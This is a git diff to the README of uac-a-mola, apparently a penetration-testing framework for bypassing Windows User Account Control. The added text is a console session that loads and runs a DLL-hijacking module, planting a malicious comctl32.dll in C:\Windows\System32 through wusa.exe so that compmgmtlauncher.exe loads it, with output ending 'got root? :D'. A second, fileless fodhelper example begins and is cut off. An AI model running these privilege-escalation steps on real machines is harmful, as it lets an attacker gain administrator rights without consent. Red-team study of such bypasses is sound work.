@@ -26,6 +26,55 @@ This is a brief section that explains the use of some of the uac-a-mola modules:
 ## Attack modules
 Using the attack modules is something very simple that hardly requires explanation. The only thing you have to do is load the corresponding module in the framework using the **_load_** command, you can see the options or input parameters using the **_show_** command, with the **_run_** command the module is executed:
 ```
+uac-a-mola> load .\modules\attack\dll_hijacking_wusa.py
+[+] Loading module...
+[+] Module loaded!
+uac-a-mola[dll_hijacking_wusa.py]> show
+
+ Author
+ ------
+ |_Pablo Gonzalez (pablo@11paths or @pablogonzalezpe)
+
+ Name
+ ----
+ |_Copy DLL with wusa.exe
+
+ Description
+ -----------
+ |_It's used for copy a DLL in privilege path (wusa method win7/8/8.1)
+
+
+ Options (Field = Value)
+ -----------------------
+ |_name_dll = comctl32.dll (name of DLL)
+ |
+ |_binary = compmgmtlauncher.exe (Path to the vulnerable binary)
+ |
+ |_malicious_dll = C:\Users\ieuser\Desktop\uac-a-mola\uacamola\payloads\comctl32\comctl32.dll (Path to a malicious dll)
+ |
+ |_name_folder = x86_microsoft.windows.common-controls_6595b64144ccf1df_6.0.7601.17514_none_41e6975e2bd6f2 (Name folder)
+ |
+ |_destination_path = C:\Windows\System32 (Destination path)
+
+
+uac-a-mola[dll_hijacking_wusa.py]> run
+[+] Running module...
+creating path...
+SUCCESS: done
+copying dll in path...
+SUCCESS: done
+creating DDF file...
+SUCCESS: done
+creating CAB file...
+SUCCESS: done
+launch wusa.exe /extract
+SUCCESS: done! got root? :D
+removing path...
+SUCCESS: done
+uac-a-mola[dll_hijacking_wusa.py]>
+```
+And other example:
+```
 uac-a-mola> load modules\attack\fileless_fodhelper.py
 [+] Loading module...
 [+] Module loaded!
@@ -123,4 +172,4 @@ Just filling this fields and executing the _run_ command, uacamola will start mo
 
 
 # Support
-Please report any error to shramos@protonmail.com or just open an issue in GitHub. Your collaboration is appreciated!
+Please report any error to santiago.hernandezramos@telefonica.com or pablo@11paths.com or just open an issue in GitHub. Your collaboration is appreciated!
